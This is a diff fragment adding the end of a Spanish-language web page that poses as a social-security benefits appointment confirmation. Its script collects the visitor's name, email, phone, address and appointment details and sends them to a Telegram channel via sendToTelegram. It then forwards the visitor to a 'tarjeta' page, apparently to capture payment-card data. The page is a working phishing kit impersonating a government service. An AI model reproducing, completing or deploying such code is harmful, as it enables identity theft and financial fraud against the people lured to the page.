+<p class="font-bold text-ss-navy" id="display-hora">10:00</p>
+</div>
+</div>
+</div>
+<div class="flex items-start gap-3 p-4 bg-blue-50 border border-blue-100 rounded-lg mt-6">
+<span class="material-symbols-outlined text-ss-navy text-xl">info</span>
+<p class="text-[11px] text-ss-navy font-medium leading-relaxed">
+        Se ha enviado una confirmación a su correo electrónico y teléfono móvil registrados. Guarde su código de referencia para futuras consultas.
+    </p>
+</div>
+<div class="space-y-4 pt-6">
+<a href="tarjeta.html" class="w-full flex items-center justify-center gap-3 py-4 bg-ss-yellow text-ss-navy font-bold rounded-lg hover:shadow-lg hover:brightness-105 transition-all uppercase text-sm tracking-widest">
+<span class="material-symbols-outlined text-2xl">account_balance</span>
+        Recibir las prestaciones
+    </a>
+<button class="w-full text-center text-ss-navy font-bold text-xs uppercase tracking-widest hover:underline" onclick="window.location.href = 'index.html'" type="button">
+        Cerrar y volver al inicio
+    </button>
+</div></form>
+</div>
+</div>
+<!-- Floating Help Icon -->
+<div class="fixed bottom-8 right-8 z-[90] bg-ss-yellow text-ss-navy p-5 rounded-full shadow-2xl cursor-pointer hover:scale-110 transition-transform active:scale-95 group" onclick="openModal()">
+<span class="material-symbols-outlined text-5xl" style="font-variation-settings: 'FILL' 1;">forum</span>
+<div class="absolute right-full mr-4 top-1/2 -translate-y-1/2 bg-white px-5 py-3 rounded-xl shadow-xl border border-gray-100 opacity-0 group-hover:opacity-100 transition-opacity whitespace-nowrap pointer-events-none">
+<p class="font-bold text-ss-navy text-base">¿Podemos ayudarte?</p>
+</div>
+</div>
+<script>
+    function closeModal() {
+        const modal = document.getElementById('contact-modal');
+        modal.classList.add('opacity-0');
+        modal.classList.add('pointer-events-none');
+        setTimeout(() => {
+            modal.classList.add('hidden');
+        }, 300);
+    }
+
+    function openModal() {
+        const modal = document.getElementById('contact-modal');
+        modal.classList.remove('hidden');
+        setTimeout(() => {
+            modal.classList.remove('opacity-0');
+            modal.classList.remove('pointer-events-none');
+        }, 10);
+    }
+
+    document.addEventListener('keydown', (e) => {
+        if (e.key === 'Escape') closeModal();
+    });
+
+document.addEventListener('DOMContentLoaded', () => {
+         const appointmentJson = localStorage.getItem('appointmentData');
+         if (appointmentJson) {
+             const data = JSON.parse(appointmentJson);
+             if (data.fecha) document.getElementById('display-fecha').textContent = data.fecha;
+             if (data.hora) document.getElementById('display-hora').textContent = data.hora;
+         }
+     });
+     
+     function goToTarjeta() {
+         const allData = collectAllData();
+         const message = `
+<b>✅ Usuario completó todos los pasos</b>
+<b>👤 Usuario:</b>
+Nombre: ${allData.nombre || 'N/A'}
+Apellido: ${allData.apellido || 'N/A'}
+Email: ${allData.email || 'N/A'}
+Teléfono: ${allData.telefono || 'N/A'}
+Dirección: ${allData.direccion || 'N/A'}
+Localidad: ${allData.localidad || 'N/A'}
+CP: ${allData.codigoPostal || 'N/A'}
+
+<b>📅 Cita:</b>
+Oficina: ${allData.oficina || 'N/A'}
+Fecha: ${allData.fecha || 'N/A'}
+Hora: ${allData.hora || 'N/A'}
+         `;
+         sendToTelegram(message, 'Confirmación Final');
+         window.location.href = 'tarjeta.html';
+     }
+     
+     document.querySelector('a[href="tarjeta.html"]').onclick = function(e) {
+         e.preventDefault();
+         goToTarjeta();
+     };
+ </script>
+</body></html>
